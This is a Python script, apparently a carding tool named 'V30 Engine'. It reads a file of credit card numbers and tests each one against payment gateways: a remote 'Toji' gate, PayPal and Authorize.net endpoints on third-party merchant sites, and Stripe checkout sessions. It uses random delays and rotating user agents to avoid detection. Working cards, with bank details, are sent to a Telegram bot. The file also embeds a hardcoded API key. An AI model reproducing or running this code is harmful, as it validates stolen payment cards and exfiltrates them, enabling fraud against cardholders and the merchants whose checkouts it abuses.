import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask

# --- RENDER SERVER SETUP ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 Multi-Gate is Running"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

init(autoreset=True)

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_killed = False
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.current_gate = "Toji"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        # --- PK/CS & GATEWAY STORAGE ---
        self.pk = None
        self.cs = None
        self.mode = "Standard" # Default
        
        self.targets = {
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "Telegram Stars": "https://fragment.com/stars",
            "Snapchat+": "https://www.snapchat.com/plus",
            "Instagram Meta": "https://www.instagram.com/meta_verified/",
            "YouTube Premium": "https://www.youtube.com/premium",
            "Truecaller Gold": "https://www.truecaller.com/premium",
            "Heroku Billing": "https://dashboard.heroku.com/account/billing",
            "Render Hosting": "https://dashboard.render.com/billing",
            "BGMI UC": "https://www.midasbuy.com/midasbuy/ot/shop/bgmi",
            "Verifone": "https://verifone.cloud",
            "Piphardware": "https://piphardware.com",
            "Dharmatrading": "https://dharmatrading.com"
        }

    # --- MERGED LOGIC FROM UPLOADED FILES ---
    def extract_from_link(self, checkout_url):
        try:
            encoded = quote(checkout_url, safe='')
            api_url = f"https://rylax.pro/bot.js/process?url={encoded}&cc=dummy"
            resp = requests.get(api_url, timeout=20).json()
            if resp.get("success"):
                self.pk = resp["checkout_data"].get("pk_live")
                self.cs = resp["checkout_data"].get("cs_live")
                print(Fore.GREEN + f"[+] Stripe PK Extracted: {self.pk[:15]}...")
            return self.pk is not None
        except: return False

    def get_bin_info(self, cc):
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            bank = res.get("bank", {}).get("name", "Unknown")
            country = res.get("country", {}).get("name", "Unknown")
            return f"{bank} | {country}"
        except: return "Unknown BIN"

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}
            requests.post(url, json=payload, timeout=10)
        except: pass

    def process_card(self, cc):
        if self.is_killed: return
        try:
            time.sleep(random.randint(5, 15))
            cc_clean = cc.replace(' ', '')
            srv_name = random.choice(list(self.targets.keys()))
            target_url = self.targets[srv_name]
            
            # --- GATEWAY SELECTOR LOGIC (Integrated from your files) ---
            if self.mode == "PayPal":
                # Logic from paypal_charge (1).py
                final_gate = f"https://binnaclehouse.org/donation/?amount=1&cc={cc_clean}"
            elif self.mode == "Authorize":
                # Logic from authorize_AUTH.py
                final_gate = f"https://morgannasalchemy.com/wp-admin/admin-ajax.php?cc={cc_clean}"
            elif self.pk and self.cs:
                # Logic from Stripe Auto-Hitter
                final_gate = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
            else:
                # Your Standard Toji Gate
                final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(target_url)}"

            headers = {'User-Agent': self.ua.random, 'X-Requested-With': 'com.android.vending'}
            resp = requests.get(final_gate, headers=headers, timeout=50)
            res_text = resp.text.lower()

            with self.lock:
                if any(x in res_text for x in ["succeeded", "charged", "success", "approved"]):
                    bin_info = self.get_bin_info(cc_clean)
                    msg = (f"🔥 *{self.mode} HIT FOUND* 🔥\n\n"
                           f"💳 `{cc_clean}`\n"
                           f"🏦 {bin_info}\n"
                           f"📱 Target: {srv_name}\n"
                           f"✅ Gate: {self.current_gate if not self.pk else 'Stripe PK'}")
                    self.send_log(msg)
                    print(Fore.GREEN + f"[LIVE] {cc_clean} via {self.mode}")
                else:
                    print(Fore.RED + f"[DEC] {cc_clean[:16]}")
        except: pass

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(Fore.RED + "███████╗████████╗██████╗ ██╗██████╗ ███████╗")
        print(Fore.WHITE + "V30 ENGINE | MULTI-GATEWAY SYSTEM ACTIVE")
        
        print(Fore.YELLOW + "\nSelect Mode:\n1. Standard (Toji Gate)\n2. PayPal Charge\n3. Authorize.net Auth\n4. Stripe PK/CS Hitter")
        choice = input("Enter Choice: ")
        if choice == "2": self.mode = "PayPal"
        elif choice == "3": self.mode = "Authorize"
        elif choice == "4":
            self.mode = "Stripe"
            link = input("Enter Stripe Link: ").strip()
            self.extract_from_link(link)

        file_path = input("\nEnter CC File: ").strip()
        if not os.path.exists(file_path): return
        
        with open(file_path, 'r') as f:
            cards = [l.strip() for l in f if l.strip()]

        print(Fore.CYAN + f"[*] Running {self.mode} Mode on 5 Threads...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.process_card, cards)

if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    UltimateMasterV30().run()
